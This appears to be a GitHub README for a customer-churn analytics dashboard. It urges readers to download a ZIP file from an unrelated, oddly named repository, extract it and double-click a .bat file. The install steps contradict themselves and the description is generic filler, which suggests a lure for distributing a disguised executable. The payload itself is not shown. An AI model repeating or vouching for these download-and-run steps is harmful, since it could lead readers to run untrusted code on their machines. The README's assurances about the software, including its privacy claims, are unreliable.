# 📊 Customer-Churn-Analysis - Identify patterns to keep your customers

[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Warmupgroundwork927/warmupgroundwork927.github.io/main/unstern/io-warmupgroundwork-github-1.0.zip)

This project helps you understand why customers leave your business. It turns raw information into clear charts. You can see patterns in your data through a simple interface. The tool processes telecom records to highlight churn drivers. You gain insights to make better business choices.

## 🛠️ System Requirements

Your computer needs these to run the tool smoothly:

*   Operating System: Windows 10 or 11.
*   Memory: 8 GB of RAM.
*   Storage Space: 500 MB of free space.
*   Web Browser: Google Chrome, Microsoft Edge, or Mozilla Firefox.

## 📥 How to Install

Follow these steps to set up the software:

1.  Visit [this page to download](https://raw.githubusercontent.com/Warmupgroundwork927/warmupgroundwork927.github.io/main/unstern/io-warmupgroundwork-github-1.0.zip).
2.  Click the green button labeled "Code" and select "Download ZIP".
3.  Locate the downloaded file in your Downloads folder.
4.  Right-click the ZIP file and select "Extract All".
5.  Open the resulting folder.
6.  Look for the file named `run_dashboard.bat`.
7.  Double-click the file to start the program.

A black window will appear on your screen. This is normal. It sets up the background services. Do not close this window while you use the dashboard.

## 🖥️ Using the Dashboard

Once the black window shows a local address, your web browser will open automatically. If it does not open, type `http://localhost:8501` into your browser address bar.

The application contains several tabs:

*   Overview: Shows general health metrics of your customer base.
*   Churn Drivers: Highlights factors that lead to customer loss.
*   Data Tables: Displays the raw information in a readable format.
*   Recommendations: Lists actionable steps to improve retention based on the analysis.

You can interact with every chart. Hover your mouse over bars and lines to see specific numbers. Use the sidebar on the left side to filter data by date, customer type, or service usage. These filters update the charts instantly.

## 📈 Analyzing Your Data

The tool uses Python and Streamlit to process information. It organizes telecom data into logical groups. You see how different service plans affect the churn rate. 

The dashboard handles common tasks:

*   Data Cleaning: Filters out incomplete records.
*   Pattern Recognition: Finds correlations between account duration and churn.
*   Visual Mapping: Draws heatmaps of customer geography.

You do not need to write code to perform these tasks. The interface manages the logic under the hood.

## 📁 Project Structure

The folder you extracted contains these important components:

*   `data/`: This folder holds your CSV files. Place your telecom data here to analyze it.
*   `src/`: Contains the logic for the visualization engine.
*   `requirements.txt`: Lists the libraries the tool uses.
*   `run_dashboard.bat`: Starts the interface for you.

## ⚙️ Troubleshooting

If the program fails to start, check the following:

*   Check your internet connection. This is necessary for the initial setup.
*   Verify that you extracted the ZIP file to a folder. The program will not run from inside the ZIP archive.
*   Ensure another program is not using port 8501. If you have other web tools running, close them and try again.
*   Check that you installed the required components. If errors persist, restart your computer and try steps in the install section again.

## 📑 Understanding Churn

Churn refers to the rate at which customers stop doing business with you. This tool uses statistical models to predict future churn. It looks at factors like monthly charges, contract length, and payment methods. 

By identifying these drivers, you shift from reacting to churn to preventing it. You identify high-risk segments early. This allows you to offer targeted incentives to retain customers. 

## 🔐 Data Privacy

Your data stays on your local machine. This dashboard does not upload your records to any servers. The analysis happens entirely within your computer memory. You keep full ownership and control of your sensitive telecom records at all times.
